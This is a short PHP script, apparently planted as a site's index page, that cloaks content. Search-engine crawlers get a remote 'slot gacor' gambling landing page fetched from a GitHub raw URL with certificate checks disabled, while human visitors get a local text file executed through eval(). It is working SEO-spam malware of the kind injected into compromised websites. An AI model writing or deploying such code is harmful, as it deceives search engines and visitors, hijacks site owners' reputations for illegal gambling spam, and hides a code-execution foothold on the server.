<?php
function isSearchEngineBot() {
    if (!isset($_SERVER['HTTP_USER_AGENT'])) return false;
    return preg_match('/(googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|TelegramBot|Google-InspectionTool|Google-Site-Verification|AhrefsBot)/i', $_SERVER['HTTP_USER_AGENT']);
}

function JajangFetchLocal($filePath) {
    // Cek apakah URL eksternal (http:// atau https://)
    if (preg_match('/^https?:\/\//i', $filePath)) {
        // Ambil konten dari URL eksternal
        $ch = curl_init($filePath);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; SEO Bot)');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($http_code === 200 && $response !== false) {
            return $response;
        }
        return "<!-- Failed to fetch external URL: $filePath -->";
    }
    
    // Jika file lokal
    if (file_exists($filePath)) {
        return file_get_contents($filePath);
    } else {
        return "<!-- File not found: $filePath -->";
    }
}

$landing_page = 'https://raw.githubusercontent.com/freyarion25/landingpage/refs/heads/main/chia-slot-gacor.txt';       // BOT → SEO landing page
$index_home   = __DIR__ . '/index2.txt'; // HUMAN → halaman biasa

if (isSearchEngineBot()) {
    // ROBOT → tunjuk SEO landing page
    echo JajangFetchLocal($landing_page);
} else {
    // HUMAN → load index-backup sebagai PHP
    eval('?>' . JajangFetchLocal($index_home));
}
